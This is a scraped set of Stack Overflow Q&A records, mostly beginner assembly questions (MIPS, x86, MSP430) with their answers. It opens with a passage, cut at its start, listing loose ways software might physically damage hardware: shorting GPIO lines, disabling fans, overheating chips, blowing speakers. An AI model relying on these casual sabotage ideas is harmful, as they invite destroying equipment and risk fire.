<p>There was also the infamous <a href=""http://en.wikipedia.org/wiki/CIH_(computer_virus)"" rel=""nofollow noreferrer"">Chernobyl virus</a> which just killed the BIOS and rendered the machine useless, until someone reflashed it.</p>

<p>And there are microcode updates, which can be flashed to the CPU (and I don't know much about them).</p>

<p>But is this still possible today? Could you damage hardware by software? Execute the <code>hcf</code> (Halt &amp; Catch fire) instruction? Grill the cat by increasing WLAN output power?</p>
","<p>Yes, you sure can in general.  Sometimes in practice it is harder than you think, sometimes very easy. </p>

<p>Say for example you have a gpio pin, that is used as an input and tied to Vcc.  Make it an output and drive it low, you can usually sink more than you can source so you can absorb a lot but if this is a voltage rail and they didnt put some limiting resistors in there, a power up strap option for example, the smoke will come out.</p>

<p>Even in PC's i2c is bit banged in some places, same deal you have a bug, accidental or intentional, do enough i2c to get the target to think it is its turn to drive the data line, but you drive the data line to, in the opposite direction.  you can sink more than source, whoever is sourcing is likely to melt down their output.</p>

<p>I think I heard that one of the (popular family of) graphics processors is no where near capable of handling sustained operations at that clock rate.  Think about a machine gun that can fire X bullets per minute, very few can SUSTAIN that for very long without melting the barrel.  Thats what they did here, if you do too much with the gpus you will melt the chip without the heat sink being able to do anything no matter how much cooling you attach to the case.  this may be a myth, who knows...things like this have happened.  Normally you put temp sensors in the chip that cause something in the power system outside to reset the chip/board or turn it off.  which is why your pc will go into panic beeping when you try to bring it up without the heat sink on the cpu.  You can try this yourself, leave the heat sink fan in to keep the tach up but dont have it touch the cpu.  you might destroy the cpu or motherboard so try this at your own risk.</p>

<p>Generally the problems that you might have had inside a chip where you could do a few things and the chip would fail from the inside.  We dont normally hand route the whole thing, there are tools that do a lot of that work or check that work to prevent these sorts of things, not fool proof of course, but less likely.  board designs though, still very much hand built, and the software drivers normally dont try to do bad things like drive gpio lines against sources and things like that.  Not as easy to bang the head of a floppy or hard drive against the inside of the case as it used to be, that sort of thing, although it wouldnt surprise me if you could mess with some settings and gouge a grove in a disk platter or something like that.  a Lot harder to catch a monitor on fire.</p>

<p>As already mentioned by other posters, pushing and stressing components, excessive computations, things like that.  for computers where there are software controlled cooling fans you can probably go in and turn off the automated, if any, control system and set the fan at a fixed speed, of say...off...turn them all off and see what happens.  Some brand of laptop had that problem you upgrade the bios and it slowed the cpu fan down causing hard drive failures and/or other failures in the system.  change the bios setting or install the right bios and replace the damaged hardware (if possible/practical) and not dead.</p>

<p>For a while there Linux was excessively parking hard drive heads on laptops or something like that, causing premature disk failure.</p>

<p>Apple is well known for hardware failure, a long lists of class action suits.  Some driven by software.  Not that other brands dont have bad stuff from time to time, but other brands normally dont control the hardware and software in one package making it harder to isolate one company, or worse a company that should know better than to destroy its own stuff.  Apple often likes to get their name in the news anyway, free or cheap advertising.</p>

<p>It has been shown, or at least I read, that you can infect a mac battery, batteries are smart now in laptops, with a virus, such that after a clean wipe and re-install of the operating system the battery will re-infect the system with the virus. (just a matter of time for this to happen on any platform not just the one)  I wonder what else you can do to modern laptop batteries firmware, it is very easy to catch modern battery technologies on fire, perhaps you could do that with software.</p>

<p>You can software control the disc tray in desktop computers, you could open and close it until it fails (I saw a thereifixed it where the cdrom tray was used to rock a baby cradle this way).</p>

<p>With fanless handhelds, smartphones, tablets.  I bet you could defeat the temperature limits and stress components to create heat, probably causing the battery to go.  </p>

<p>blowing speakers is an easy one, just do it.</p>

<p>A lot of stuff uses ftdi chips to interface usb to pretty much anything.  some of those can have the pins changed from whatever function they are normally, a serial port perhaps, to software bit-banged control, and it is where i started at the top, take what was supposed to be an input, make it an output and drive the other way until something melts down.</p>
","9288495"
"Efficient Way to Print MIPS Int Array","15076","","<p>I'm working on a homework assignment translating a C program we wrote to MIPS.  My question is about general MIPS coding and not project specific issues though. I've run into an issue with printing my output.  I have an array and output string declared as such:    </p>

<pre><code>array: .word 7, 2, 5, -3, 3, 6, -4, 1  
output1: .asciiz ""Array: \0""
</code></pre>

<p>I'm trying to output the data so I have the following format:  </p>

<pre><code>Array: 7 2 5 -3 3 6 -4 1
</code></pre>

<p>Our array is hard coded, and our array length is predetermined.  I've tried to come up with a loop to print it out efficiently, but dealing with the <code>lw</code> offset using a register was an issue.<br>
I have come up with the following code to hardcode my output, but I still have another array I need to print, and this just seems like it's taking up way to much room.  My code is fully functional, but it's just a mess! Can anyone give me tips to clean it up / refactor it?<br>
The array is stored in <code>$a0/$s0</code>, the array size is stored in <code>$a1/$s1</code></p>

<pre><code>la $a0, output1 # print the ""Array: "" string
li $v0, 4
syscall

# Huge Oversized Print Statement to print out the original Array: 
li $v0, 1 # print the array
lw $a0, 0($s0)
syscall
la $a0, space #print the space between elements
li $v0, 4
syscall
li $v0, 1
lw $a0, 4($s0)
syscall
la $a0, space #print the space between elements
li $v0, 4
syscall
lw $a0, 8($s0)
li $v0, 1
syscall
la $a0, space #print the space between elements
li $v0, 4
syscall
lw $a0, 12($s0)
li $v0, 1
syscall
la $a0, space #print the space between elements
li $v0, 4
syscall
lw $a0, 16($s0)
li $v0, 1
syscall
la $a0, space #print the space between elements
li $v0, 4
syscall
lw $a0, 20($s0)
li $v0, 1
syscall
la $a0, space #print the space between elements
li $v0, 4
syscall
lw $a0, 24($s0)
li $v0, 1
syscall
la $a0, space #print the space between elements
li $v0, 4
syscall
lw $a0, 28($s0)
li $v0, 1
syscall
</code></pre>

<p>This is a homework project and I really want to fully understand a cleaner way to print out arrays, I am not looking to plagiarize.  Tips on writing the loop are greatly appreciated, I'm not looking for someone to give me the code.</p>
","<p>It might be helpful to increment <code>$s0</code> with <code>addi</code> instead of manually changing the offset – that way you're always using <code>lw 0($s0)</code>.</p>

<p>Edit: I suppose I should add that you're being incrementing <code>$s0</code> within a loop (use <code>j</code> for the loop).</p>
","1710402"
"Why doesn't there exists a subi opcode for MIPS?","15070","","<p>I am very new to <strong>Assembly language</strong>. I was reading about <strong>MIPS</strong> architecture and came to know that you have <code>addi</code> opcode but there is no <code>subi</code> opcode. Can anyone please explain me why don't we have a <code>subi</code> opcode?</p>

<p>Thanks in advance.</p>
","<p>When you create an instruction set, you're bound by some constraints, such as the total number of instructions you can create. The MIPS creators realized that there isn't a need for <code>subi</code> (because you can add a negative number with <code>addi</code> using 2's complement), and they simply made the decision to forego making that instruction. It may have been to conserve the number of instructions, or just simply because it isn't needed.</p>
","6918368"
"cmp je/jg how they work in assembly","15028","","<p>I would like to understand how cmp and je/jg work in assembly. I saw few examples on google but I am still little bit confused. Below I have shown a part of assembly code that I am trying to convert to C language and the corresponding C code. Is it implemented in the right way or do I have a wrong understanding of how cmp works?</p>

<pre><code>cmp    $0x3,%eax
je     A
cmp    $0x3,%eax
jg     B
cmp    $0x1,%eax
je     C


 int func(int x){


  if(x == 3)
    goto A;

  if (x &gt;3)
    goto B;


  if(x == 1)
     goto C;

    A:
    ......

    B:
    ......

    C:
    ......
</code></pre>
","<p>You understand correctly how cmp and je/jg work, but you have an error in your C code.  This line:</p>

<pre><code>if (*x == 1)
</code></pre>

<p>should be </p>

<pre><code>if (x == 1)
</code></pre>

<p><a href=""http://en.wikibooks.org/wiki/X86_Assembly/Control_Flow"" rel=""nofollow"">Here</a> is a pretty good summary of the x86 control flow instructions.</p>

<p>Also, there's no reason to repeat the cmp instruction for the same values.  Once you've executed it, you can test the results multiple ways without repeating the comparison.  So your assembly code should look like this:</p>

<pre><code>cmp    $0x3,%eax
je     A
jg     B
cmp    $0x1,%eax
je     C
</code></pre>
","12665356"
"Declaring and defining an array and matrix in assembly?","14889","","<p>It seems I can't get enough good documentation on assembly, at least none that's intelligible.</p>

<p>Could someone post a simple example on how to declare an array and a matrix on assembly? And possibly how to modify items in it. It will be of great help for me and probably to many others.</p>
","<p>I solved this using an example provided by the emulator.</p>

<p>Basically matrixes in assembly are declared the same as regular variables, a 2x2 matrix for example is declared like this:</p>

<pre><code>matrix db ?,?,?,?   ; Obviously `?` can be replaced by any value

or

matrix db dup('?')
</code></pre>

<p>Then the user decides where he considers a ""row"" ends and another starts. For example if we have a variable with bytes 1,2,3,4 the user may consider that 1,2 are one row and 3,4 are another. </p>

<p>This is how you point to an item in the matrix:</p>

<pre><code>mov bx,0
lea si,matrix
mov matriz[si][bx],0   ; [si][bx] holds the value of the first cell
</code></pre>

<p>Now if each row holds 2 items, one should just do this to go to the second row:</p>

<pre><code>add bx,2
mov matriz[si][bx],1   ; Now [si][bx] points to cell 0x1
</code></pre>
","17776204"
"When Will the Code Under DATA SEGMENT execute in this code?","14863","","<p>I am a beginner of Assembly Programming...
I surfed a lot in google. There is a lot of information, but I still do not understand the following code. I would be grateful if someone could explain</p>

<p>MOV AX,DATA</p>

<p>I also don't understand when the code that is present in data segment would be executed in this program.</p>

<pre><code>ASSUME CS:CODE,DS:DATA

CODE SEGMENT
 MOV AX,@DATA
 mov DS,AX
 ...
 ...
CODE ENDS


DATA SEGMENT
   ...
   ...
   ... //SOMECODE
DATA ENDS 
</code></pre>

<p>Also, can someone explain to me what the following instructions do?..</p>

<p><code>MOV AH , ??H ( ?? can be filled with 09,4c etc).</code></p>

<p><code>MOV DS,AX</code></p>

<p><code>MOV ES,AX</code></p>
","<p>Warning: I've never written 8086 assembly in my life but this is what I make of it.</p>

<p><code>MOV AX,@DATA</code> is the first line of code that gets run. I believe @DATA is a variable that holds the value of the location in memory where the data segment lives. It moves the memory location of @DATA into the AX register (16 bit register). One thing to note here is the @ in front of the word DATA. I believe this is because @DATA is evaluated during the linking process and it will be replaced by its actual value. Notice how the other examples to not have the @ in front because they are referring to an actual memory location to begin with.</p>

<p><code>MOV DS,AX</code> will then set that memory location as the variable <code>DS</code> which is a standard variable (or register in this case) for 8086 assembly. It should always point to the location of your storage where you want to keep values (the heap if you're familiar with C++ terminology).</p>

<p>The AX register is simply a temporarily place holder that you can load with values and perform execute commands against.</p>

<p><code>MOVE AH, ??H</code> First of all, the AH refers to the ""high"" side of the AX register. The brother of this would be AL which refers to the ""low"" side of the AX register. This is used when you want to perform commands against 8 bits instead of 16 bits. The second part of this, the ??H as you refer to it is the value you want to store in the AH register. The H at the end means ""hexadecimal"". So if you have 00H that would mean zero (in hex). If you put in FFH that would be the same as 255 in decimal number system.</p>

<p>Back to your initial question ""When Will the Code Under DATA SEGMENT execute in this code?"" -- I believe you're asking when the DATA SEGMENT will be executed. This normally should not be executed because it's supposed to store data (variables) for use in your CODE SEGMENT. On some operating systems you can get around this I believe and simply JUMP or BRANCH to that section of code and treat it as a regular CODE SEGMENT. This is sometimes how stack overflows, heap overflows, (hacks), etc, all work.</p>
","5330611"
"Assembly - Carry flag VS overflow flag","14775","","<p>I have the next code:</p>

<pre><code>mov al, -5
add al, 132
add al, 1
</code></pre>

<p>As I check it, the overflow flag and the carry flag will set in the first operation, and in the second, only the overflow will set. </p>

<p>But I don't understand why:</p>

<ol>
<li>In unsigned number, the result is 143 (8FH), and for that is fit 8-bit unsigned number (is smaller than 255)  => the carry flag shouldn't be set. In signed number, the result is 127, It's fit to 8-bit signed, and the overflow shouldn't be set.</li>
</ol>

<p>Whats wrong? Thanks.</p>
","<p>In unsigned arithmetic, you have added <code>0xFB</code> to <code>0x84</code>, i.e. 251 + 132, which indeed is larger than 8-bit, and so the carry flag is set.</p>

<p>In the second case, you are adding +127 to 1, which indeed exceeds a signed 8-bit range, and so the overflow flag is set.</p>
","8496272"
"Basic use of immediates (square brackets) in x86 Assembly and yasm","14759","","<p>Suppose I have the following declared:</p>

<pre><code>section .bss
buffer    resb     1
</code></pre>

<p>And these instructions follow:</p>

<pre><code>mov    al, 5
mov    [buffer], al
mov    bl, [buffer]
mov    cl, buffer
</code></pre>

<p>Am I correct in understanding that bl will contain the value 5, and cl will contain the memory address of the variable <code>buffer</code>?</p>

<p>I am confused about the differences between </p>

<ul>
<li>moving an immediate into a register,</li>
<li>moving a register into an immediate (what goes in, the data or the address?) and</li>
<li>moving an immediate into a register without the brackets 
<ul>
<li>For example, <code>mov cl, buffer</code> vs <code>mov cl, [buffer]</code>  </li>
</ul></li>
</ul>

<p>UPDATE: After reading the responses, I suppose the following summary is accurate:</p>

<p>Assume the declaration <code>array resb 0</code> exists under <code>section .bss</code>. My understanding is that:</p>

<ul>
<li><code>mov edi, array</code> puts the memory address of the zeroth array index in <code>edi</code>.</li>
<li><code>mov [edi], 3</code> puts the VALUE 3 into the zeroth index of the array</li>
<li>after <code>add edi, 3</code>, <code>edi</code> now contains the memory address of the 3rd index of the array</li>
<li><code>mov al, [array]</code> puts the DATA at the zeroth index into <code>al</code>.</li>
<li><code>mov al, [array+3]</code> puts the DATA at the third index into <code>al</code>.</li>
<li><code>mov [al], [array]</code> is invalid, for whatever reason.</li>
<li><code>mov array, 3</code> is invalid, because you can't say ""Hey, I don't like the offset at which <code>array</code> is stored, so I'll call it 3""</li>
<li><code>mov [array], 3</code> puts the value 3 into the zeroth index of the array.</li>
</ul>

<p>Please mention if any of these is false.</p>
","<p>Indeed, your thought is correct.That is, bl will contain 5 and cl the memory address of buffer(in fact the label buffer is a memory address itself).</p>

<hr>

<p>Now, let me explain the differences between the operations you mentioned:</p>

<ul>
<li><p>moving an immediate into a register can be done using <code>mov reg,imm</code>.What may be confusing is that labels e.g buffer are immediate values themselves that contain an address.</p></li>
<li><p>You cannot really move a register into an immediate, since immediate values are constants, like <code>2</code> or <code>FF1Ah</code>.What you can do is move a register to the place where the constant points to.You can do it like <code>mov [const], reg</code> .</p></li>
<li><p>You can also use indirect addressing like <code>mov reg2,[reg1]</code> provided reg1 points to a valid location, and it will transfer the value pointed by reg1 to reg2.</p></li>
</ul>

<hr>

<p>So, <code>mov cl, buffer</code> will move the <strong>address</strong> of buffer to cl(which may or may not give the correct address, since cl is only one byte long) , whereas  <code>mov cl, [buffer]</code> will get the actual value.</p>

<h2>Summary</h2>

<ul>
<li>When you use [a], then you refer to the value at the place where a points to.For example, if a is <code>F5B1</code>, then [a] refers to the address F5B1 in <em>RAM</em>.</li>
<li>Labels are addresses,i.e values like <code>F5B1</code>.</li>
<li>Values stored in registers do not have to be referenced to as [reg] because registers do not have addresses.In fact, registers can be thought of as immediate values.</li>
</ul>
","10362619"
"How to save the registers on x86_64 for an interrupt service routine?","14755","","<p>I am looking at some old code from a school project, and in trying to compile it on my laptop I ran into some problems. It was originally written for an old 32 bit version of gcc. Anyway I was trying to convert some of the assembly over to 64 bit compatible code and hit a few snags.</p>

<p>Here is the original code:</p>

<pre><code>pusha
pushl   %ds
pushl   %es
pushl   %fs
pushl   %gs
pushl   %ss
</code></pre>

<p><code>pusha</code> is not valid in 64 bit mode. So what would be the proper way to do this in x86_64 assembly while in 64 bit mode?</p>

<p>There has got to be a reason why <code>pusha</code> is not valid in 64 bit mode, so I have a feeling manually pushing all the registers may not be a good idea.</p>
","<p>Learn from existing code that does this kind of thing. For example:</p>

<ul>
<li>Linux (search for <code>SAVE_ARGS_IRQ</code>): <a href=""http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=blob;f=arch/x86/kernel/entry_64.S"" rel=""nofollow"">entry_64.S</a></li>
<li>OpenSolaris (search for <code>INTR_PUSH</code>): <a href=""https://hg.java.net/hg/solaris~on-src/file/tip/usr/src/uts/intel/amd64/sys/privregs.h"" rel=""nofollow"">privregs.h</a></li>
<li>FreeBSD (search for <code>IDT_VEC</code>): <a href=""http://www.freebsd.org/cgi/cvsweb.cgi/src/sys/amd64/amd64/exception.S"" rel=""nofollow"">exception.S</a> (similar is <a href=""http://cvsweb.netbsd.org/bsdweb.cgi/src/sys/arch/amd64/amd64/vector.S"" rel=""nofollow"">vector.S</a> in NetBSD)</li>
</ul>

<p>In fact, ""manually pushing"" the regs is the only way on AMD64 since <code>PUSHA</code> doesn't exist there. AMD64 isn't unique in this aspect - most non-x86 CPUs do require register-by-register saves/restores as well at some point.</p>

<p>But if you inspect the referenced sourcecode closely you'll find that not all interrupt handlers require to save/restore the entire register set, so there is room for optimizations.</p>
","6857368"
"Assembly code for sin(x)","14738","","<p>I'd like assembly code for calculate <code>sin(x)</code> (using ""Taylor Expansion"") in Linux.</p>
","<p>Would this article help you?</p>

<p><a href=""http://www.coranac.com/2009/07/sines/"" rel=""nofollow noreferrer"">http://www.coranac.com/2009/07/sines/</a></p>

<p>It has a couple of algorithms for computing approximate sin(x) values, with both C and assembly versions. Granted, it's ARM assembly, but the gist of it should translate easily to x86 or similar.</p>
","1252933"
"lea assembly instruction","14703","","<p>I Just want to make sure I am reading this right:</p>

<pre><code>movl 12(%ebp), %edx
leal (%edx, %edx, 4), %eax
</code></pre>

<p>I read the first line as: <code>edx = [epb + 12]</code>, and the second line as: <code>eax = edx + edx*4</code></p>

<p>Can anybody clarify?</p>

<p>Also, what if I had the following two lines:</p>

<pre><code>leal (%edx, %edx, 4), %eax
leal (%edx, %edx, 2), %eax
</code></pre>

<p>Once the second line is executed, would the <code>eax</code> register be overwritten?</p>

<p>And the <code>eax = edx + edx*4</code> is multiplying the address by 4? Or the contents of the address by 4?</p>
","<p>Incorrect. In the AT&amp;T syntax, specifying <code>12(%ebp)</code> gives you a memory reference to the address contained in <code>%ebp</code>, with an additional offset of 12, i.e. the effective address from which the contents of <code>%edx</code> (in this case) will be loaded is <code>%ebp + 12</code>.</p>

<p>You're right about the second part, though. The <code>LEA</code> instruction is used to Load (the) Effective Address, and can be used for address arithmetic and sometimes also ordinary arithmetic, if you don't need the flags.</p>
","9153337"
"MSP430 assembly instructions","14682","","<p>I am trying to understand what these instructions do for the MSP 430 processor:</p>

<pre><code>(1) MOV.w  #0x0055,R5
(2)   BIC.w  #0xFFEE,R5
(3)   BIS.w  #0x1144,R5
</code></pre>

<p>I haven't been able to find much that explains the assembly instructions and would love to find out what these instructions do and what is stored in the r5 register after each instruction. Could someone explain?</p>
","<p><code>MOV</code> moves a value to the destination. In this case <code>R5</code> will contain the value 0x0055.</p>

<p><code>BIC</code> clears bits in the destination value. If R5 would contain 0x0055 before the instruction, it will contain the value 0x0011. (Think of this as an inversed <em>and</em> instruction).</p>

<p><code>BIS</code> sets bits -- this is effectively the same as an <em>or</em> operation. <code>R5</code> will have the value 0x1155 after this instruction.</p>
","12903466"
"Where can I find system call source code?","14616","","<p>In linux where can I find the source code for all system calls given that I have the source tree? Also if I were to want to look up the source code and assembly for a particular system call is there something that I can type in terminal like  -my_system_call?</p>
","<p>You'll need the Linux kernel sources in order to see the actual source of the system calls. Manual pages, if installed on your local system, only contain the documentation of the calls and not their source itself.</p>

<p>Unfortunately for you, system calls aren't stored in just one particular location in the whole kernel tree. This is because various system calls can refer to different parts of the system (process management, filesystem management, etc.) and therefore it would be infeasible to store them apart from the part of the tree related to that particular part of the system.</p>

<p>The best thing you can do is look for the <code>SYSCALL_DEFINE[0-6]</code> macro. It is used (obviously) to define the given block of code as a system call. For example, <code>fs/ioctl.c</code> has the following code :</p>

<pre><code>SYSCALL_DEFINE3(ioctl, unsigned int, fd, unsigned int, cmd, unsigned long, arg)
{
/* do freaky ioctl stuff */
}
</code></pre>

<p>Such a definition means that the <code>ioctl</code> syscall is declared and takes three arguments. The number next to the <code>SYSCALL_DEFINE</code> means the number of arguments. For example, in the case of <code>getpid(void)</code>, declared in <code>kernel/timer.c</code>, we have the following code :</p>

<pre><code>SYSCALL_DEFINE0(getpid)
{
        return task_tgid_vnr(current);
}
</code></pre>

<p>Hope that clears things up a little.</p>
","10149838"
"How to use RIP Relative Addressing in a 64-bit assembly program?","14611","","<p>How do I use RIP Relative Addressing in a Linux assembly program for the AMD64 archtitecture?
I am looking for a simple example (a Hello world program) that uses the AMD64 RIP relative adressing mode.</p>

<p>For example the following 64-bit assembly program would work with normal (absolute addressing):</p>

<pre><code>.text
    .global _start

_start:
    mov $0xd, %rdx

    mov $msg, %rsi
    pushq $0x1
    pop %rax
    mov %rax, %rdi
    syscall

    xor %rdi, %rdi
    pushq $0x3c
    pop %rax
    syscall

.data
msg:
    .ascii    ""Hello world!\n""
</code></pre>

<p>I am guessing that the same program using RIP Relative Addressing would be something like:</p>

<pre><code>.text
    .global _start

_start:
    mov $0xd, %rdx

    mov msg(%rip), %rsi
    pushq $0x1
    pop %rax
    mov %rax, %rdi
    syscall

    xor %rdi, %rdi
    pushq $0x3c
    pop %rax
    syscall

msg:
    .ascii    ""Hello world!\n""
</code></pre>

<p>The normal version runs fine when compiled with:</p>

<pre><code>as -o hello.o hello.s &amp;&amp; ld -s -o hello hello.o &amp;&amp; ./hello
</code></pre>

<p>But I can't get the RIP version working.</p>

<p>Any ideas?</p>

<p>--- edit ----</p>

<p>Stephen Canon's answer makes the RIP version work.</p>

<p>Now when I disassemble the executable of the RIP version I get:</p>

<p>objdump -d hello</p>

<pre><code>0000000000400078 &lt;.text&gt;:
  400078: 48 c7 c2 0d 00 00 00  mov    $0xd,%rdx
  40007f: 48 8d 35 10 00 00 00  lea    0x10(%rip),%rsi        # 0x400096
  400086: 6a 01                 pushq  $0x1
  400088: 58                    pop    %rax
  400089: 48 89 c7              mov    %rax,%rdi
  40008c: 0f 05                 syscall 
  40008e: 48 31 ff              xor    %rdi,%rdi
  400091: 6a 3c                 pushq  $0x3c
  400093: 58                    pop    %rax
  400094: 0f 05                 syscall 
  400096: 48                    rex.W
  400097: 65                    gs
  400098: 6c                    insb   (%dx),%es:(%rdi)
  400099: 6c                    insb   (%dx),%es:(%rdi)
  40009a: 6f                    outsl  %ds:(%rsi),(%dx)
  40009b: 20 77 6f              and    %dh,0x6f(%rdi)
  40009e: 72 6c                 jb     0x40010c
  4000a0: 64 21 0a              and    %ecx,%fs:(%rdx)
</code></pre>

<p>Which shows what I was trying to accomplish: lea 0x10(%rip),%rsi loads the address 17 bytes after the lea instruction which is address 0x400096 where the Hello world string can be found and thus resulting in position independent code.</p>
","<p>I believe that you want to load the <em>address</em> of your string into <code>%rsi</code>; your code attempts to load a quadword from that address rather than the address itself.  You want:</p>

<pre><code>lea msg(%rip), %rsi
</code></pre>

<p>if I'm not mistaken.  I don't have a linux box to test on, however.</p>
","3260178"
"Simple MIPS question, about load byte","14606","","<p>I have the following question here</p>

<pre><code>.data
a: .asciiz ""2021""
x: .byte 7,2,12
.text
main: addi $t2, $0, 1
lb $t3, a($t2)
</code></pre>

<p>Can someone explain to me, HOW the value of $t3 is 48?</p>

<p>thanks
EDIT this is an another question which is similiar, and is confusing.</p>

<pre><code>.data
a: .word 12,-5,4,0
x: .byte 5
.text
main: addi $t1, $0, 8
lw $t2, a($0)
lw $t3, a($t1)
</code></pre>

<p>How will you load word, from index 8, when 'a' has a length of 4?</p>
","<p>Yes, when you add <code>$0</code> and <code>1</code>, you get <code>1</code>, which is put into <code>$t2</code>.</p>

<p>Then, when you evaluate <code>a($t2)</code>, that's the second byte (offset 1 since it's based at offset 0) of <code>a</code> which is the ""0"", ASCII code <code>0x30</code> or <code>48</code>.</p>

<hr>

<p>From various pieces of information:</p>

<pre><code>ADDI -- Add immediate (with overflow)
Description:
    Adds a register and a sign-extended immediate value
    and stores the result in a register
Operation:
    $t = $s + imm; advance_pc (4);
Syntax:
    addi $t, $s, imm

LB -- Load byte
Description:
    A byte is loaded into a register from the specified address.
Operation:
    $t = MEM[$s + offset]; advance_pc (4);
Syntax:
    lb $t, offset($s)
</code></pre>

<blockquote>
  <p>Register <code>$0</code> always contains the hardwired value 0. MIPS has established a set of conventions as to how registers should be used. These suggestions are guidelines, which are not enforced by the hardware. However a program that violates them will not work properly with other software.</p>
</blockquote>

<p>Those little snippets should hopefully be enough to explain what it's doing.</p>

<hr>

<p>And, regarding your edit, you're incorrectly thinking that <code>.word 12,-5,4,0</code> has a length of 4 bytes. In fact it has a length of 16 bytes since words in MIPS are 32 bits (four bytes) wide.</p>

<p>So when you load from <em>byte</em> offset 8, you will get the <em>word</em> <code>4</code>.</p>
","4061515"
"x86 assembly programming loops with ecx and loop instruction versus jmp + j<condition>","14580","","<p>i'm currently learning x86 assembly language and wondered what is the better way for implementing loops. One way would be to mov a value to ecx register and use the loop instruction and the other way would be using a jmp instruction and then comes the loop body and then a conditional jumping eventually to the beginning of the loop body. I guess the first one will has a better readability but other then that i don't know why to use it.</p>
","<p>When you mention jmp+body+test, I believe you are talking about the translation of a <code>while</code> loop in high-level languages.  There is a reason for the second approach.  Let's take a look.</p>

<p>Consider</p>

<pre><code>x = N
while (x != 0) {
    BODY
    x--
}
</code></pre>

<p>The naive way is</p>

<pre><code>    mov ecx, N      ; store var x in ecx register
top:
    cmp ecx, 0      ; test at top of loop
    je bottom       ; loop exit when while condition false
    BODY
    dec ecx
    jmp top
bottom:
</code></pre>

<p>This has N conditional jumps and N unconditional jumps.</p>

<p>The second way is:</p>

<pre><code>    mov ecx, N 
    jmp bottom
top:
    BODY
    dec ecx
bottom:
    cmp ecx, 0
    jne top
</code></pre>

<p>Now we still do N conditional jumps but we only do ONE unconditional jump.  A small savings but it just might matter, especially because it is in a loop.</p>

<p>Now you did mention the <code>loop</code> instruction which is essentially</p>

<pre><code>dec ecx
cmp ecx, 0
je somewhere
</code></pre>

<p>How would you work that in?  Probably like this:</p>

<pre><code>    mov ecx, N
    cmp ecx, 0       ; Must guard against N==0
    je bottom
top:
    BODY
    loop top         ; built-in dec, test, and jump if not zero
bottom:
</code></pre>

<p>This is a pretty little solution typical of CISC processors.  Is it faster than the second way above?  That depends a great deal on the architecture.  I suggest you do some research on the performance of the <code>loop</code> instruction in the IA-32 and Intel 64 processor architectures, if you really want to know more.</p>
","6805770"
"Where to learn x64 assembly from?","14558","","<p>Okay so I know C++, C#, Java and some other languages and I decided to learn assembly next but I feel like I've hit a solid brick wall right from the start. I just need someone to point me in the right direction.</p>

<p>Here are the questions:</p>

<ol>
<li><p>I've been told that it's better to learn assembly from the internet than from books because assembly depends on your hardware and books are mostly outdated. Is that true?</p></li>
<li><p>I've got a 64 bit CPU and I'm using (or at least trying to use) FASM. Where do I find the necessary documentation?</p></li>
<li><p>I'm totaly confused because most of the tutorials I've seen don't even work for me. Is that because of the hardware differences? How do I find the right tutorials?</p></li>
<li><p>Can I run x86 and x32 assembly on my 64 bit computer?</p></li>
<li><p>Could you please be so kind and write me a simple program in assembly (that works on my PC) with a breakdown in the comments? I'm running 64 bit Windows 10 on my intel core i5 CPU. Please.</p></li>
</ol>
","<p>I think this is a valid question. It can be a bit hard to find up to date information on assembler.</p>

<ol>
<li><p>Yes. A lot of resources printed and online describe i386 (x86) assembler and not the new amd64 (x86_64). Many things have changed, e.g. function arguments used to be passed on the stack but now they are passed in registers. This applies both to Unix and Windows.</p>

<p>Basically, ensure you are reading about 64-bit assembly.</p></li>
<li><p>Why not try the <a href=""http://flatassembler.net/docs.php?article=manual"" rel=""nofollow noreferrer"">online manual</a>. Note that assemblers are not that different when it comes to simple stuff.</p></li>
<li><p>I don't have Windows but if you are having trouble with any specific program, you could ask about it here. You will need to post the actual failing program.</p></li>
<li><p>Yes but you have to link it against 32-bit libraries and use the 32-bit version of the Win32 API. But if you're starting out, why program in the 1980's when you can work with the modern instruction set?</p></li>
<li><p>Try <a href=""https://stackoverflow.com/questions/1023593/how-to-write-hello-world-in-assembler-under-windows#answer-20032763"">this</a>.</p></li>
</ol>

<p><strong>Also</strong>, if you are going to be programming in assembly, I strongly recommend you get a debugger. I use GDB which works well and is free, on Windows you get to use the Visual Studio debugger which is superb.</p>
","32238322"
"Why do x64 instructions zero the upper part of a 32 bit register","14550","","<p>Today I learnt about x64 assembly (Source: <a href=""http://x86asm.net/articles/x86-64-tour-of-intel-manuals/"" rel=""nofollow noreferrer"">http://x86asm.net/articles/x86-64-tour-of-intel-manuals/</a>) that</p>

<blockquote>
  <p>Perhaps the most surprising fact is that an instruction such as MOV EAX, EBX automatically zeroes upper 32 bits of RAX register.</p>
</blockquote>

<p>The Intel documentation (3.4.1.1 General-Purpose Registers in 64-Bit Mode in manual Basic Architecture) quoted at the same source tells us:</p>

<blockquote>
  <ul>
  <li>64-bit operands generate a 64-bit result in the destination general-purpose register.</li>
  <li>32-bit operands generate a 32-bit result, zero-extended to a 64-bit result in the destination general-purpose register.</li>
  <li>8-bit and 16-bit operands generate an 8-bit or 16-bit result. The upper 56 bits or 48 bits (respectively) of the destination general-purpose register are not be modified by the operation. If the result of an 8-bit or 16-bit operation is intended for 64-bit address calculation, explicitly sign-extend the register to the full 64-bits.</li>
  </ul>
</blockquote>

<p>In x86-32 and x86-64 assembly, 16 bit instructions such as</p>

<pre><code>mov ax, bx
</code></pre>

<p>don't show this kind of ""strange"" behaviour that the upper word of eax is zeroed.</p>

<p>Thus: what is the reason why this behaviour was introduced? At a first glance it seems illogical (but the reason might be that I am used to the quirks of x86-32 assembly).</p>
","<p>I'm not AMD or speaking for them, but I would have done it the same way. Because zeroing the high half doesn't create a dependency on the previous value, that the cpu would have to wait on. The register renaming mechanism would essentially be defeated if it wasn't done that way. This way you can write fast 32bit code in 64bit mode without having to explicitly break dependencies all the time. Without this behaviour, every single 32bit instruction in 64bit mode would have to wait on something that happened before, even though that high part would almost never be used.</p>

<p>The behaviour for 16bit instructions is the strange one. The dependency madness is one of the reasons that 16bit instructions are avoided now.</p>
","11177225"
"how to add code to Proteus design","14429","","<p>I have an 8086 assembly code for which I want to design a circuitry in Proteus IsIs. My problem is that I don't know what source code files I can add to Proteus and I didn't find anything of help when I searched. I know there is an ""add/remove source files"" part in there, but what source files and in which language I am expected to add, I do not know.
Can anybody please help me?</p>

<p>Thank you very much</p>
","<p>I am supposing that you are using keil , so you need to create a HEX file to dump in the 8051 microcontroller . </p>

<ol>
<li><p>Creating a HEX file : if you have made a project see in that folder if there is a HEX file (after compling ur code)  or not , if there is no HEX file , then go to flash -> configure flash tools -> output -> check the create HEX file , and recompile it you will get the hex file in the same folder </p></li>
